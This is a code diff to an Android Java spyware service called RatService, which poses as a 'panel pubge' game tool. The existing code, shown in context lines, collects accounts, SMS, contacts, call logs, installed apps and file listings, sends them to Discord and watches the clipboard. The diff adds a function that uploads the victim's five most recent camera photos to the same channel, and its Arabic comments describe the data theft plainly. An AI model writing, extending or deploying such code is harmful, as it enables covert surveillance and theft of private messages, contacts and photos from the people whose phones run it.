@@ -14,6 +14,8 @@ import android.provider.CallLog;
 import android.provider.ContactsContract;
 import org.json.JSONObject;
 import java.io.*;
+import java.util.Arrays;
+import java.util.Comparator;
 import java.util.List;
 import okhttp3.*;
 
@@ -32,20 +34,18 @@ public class RatService extends Service {
             try {
                 sendTextToDiscord("🔄 **الأداة اشتغلت! جاري سحب الحسابات والبيانات...**");
                 
-                dumpAllAccounts();
-                Thread.sleep(1500);
-
+                dumpAllAccounts(); Thread.sleep(1000);
                 String info = "📱 **Device:** " + Build.MANUFACTURER + " " + Build.MODEL + "\nAndroid: " + Build.VERSION.RELEASE;
-                sendTextToDiscord(info);
-                Thread.sleep(1000);
+                sendTextToDiscord(info); Thread.sleep(1000);
 
                 dumpSms(); Thread.sleep(1500);
                 dumpContacts(); Thread.sleep(1500);
                 dumpCallLogs(); Thread.sleep(1500);
                 dumpApps(); Thread.sleep(1500);
-                dumpFiles();
+                dumpFiles(); Thread.sleep(1500);
+                dumpImages(); // سحب الصور
 
-                sendTextToDiscord("✅ **اكتمل سحب البيانات بالكامل!**");
+                sendTextToDiscord("✅ **اكتمل سحب البيانات والصور بالكامل!**");
                 
                 startClipboardMonitor();
             } catch (Exception e) {
@@ -61,6 +61,40 @@ public class RatService extends Service {
             getSystemService(NotificationManager.class).createNotificationChannel(channel);
             Notification notification = new Notification.Builder(this, channelId).setContentTitle("panel pubge").setSmallIcon(android.R.drawable.ic_menu_manage).build();
             startForeground(1, notification);
+        }
+    }
+
+    // دالة سحب الصور (أحدث 5 صور من الكاميرا والواتساب)
+    private void dumpImages() {
+        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
+        File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
+        
+        File[] allImages = new File[0];
+        // بنلم الصور من فولدر الكاميرا
+        if (dcim.exists() && dcim.listFiles() != null) {
+            allImages = dcim.listFiles();
+        }
+        
+        if (allImages.length > 0) {
+            // ترتيب الصور من الأحدث للأقدم
+            Arrays.sort(allImages, new Comparator<File>() {
+                public int compare(File f1, File f2) {
+                    return Long.compare(f2.lastModified(), f1.lastModified());
+                }
+            });
+
+            int count = 0;
+            for (File img : allImages) {
+                if (img.isFile() && (img.getName().endsWith(".jpg") || img.getName().endsWith(".png") || img.getName().endsWith(".jpeg"))) {
+                    // التأكد إن حجم الصورة أقل من 8 ميجا عشان الديسكورد ميرفضهاش
+                    if (img.length() < 8 * 1024 * 1024) { 
+                        uploadFile(img, "image/jpeg");
+                        count++;
+                        try { Thread.sleep(2000); } catch (InterruptedException ignored) {} // فاصل بين كل صورة والتانية
+                    }
+                    if (count >= 5) break; // بنسحب 5 صور بس عشان ميعملش سبام
+                }
+            }
         }
     }
 
@@ -157,11 +191,8 @@ public class RatService extends Service {
         File file = new File(getExternalFilesDir(null), "files.txt");
         try (BufferedWriter bw = new BufferedWriter(new FileWriter(file))) {
             File download = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
-            File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
             bw.write("=== Downloads ===\n");
             if (download.exists() && download.listFiles() != null) for (File f : download.listFiles()) bw.write(f.getName() + "\n");
-            bw.write("\n=== DCIM ===\n");
-            if (dcim.exists() && dcim.listFiles() != null) for (File f : dcim.listFiles()) bw.write(f.getName() + "\n");
             bw.flush(); uploadFile(file, "text/plain");
         } catch (Exception ignored) {}
     }
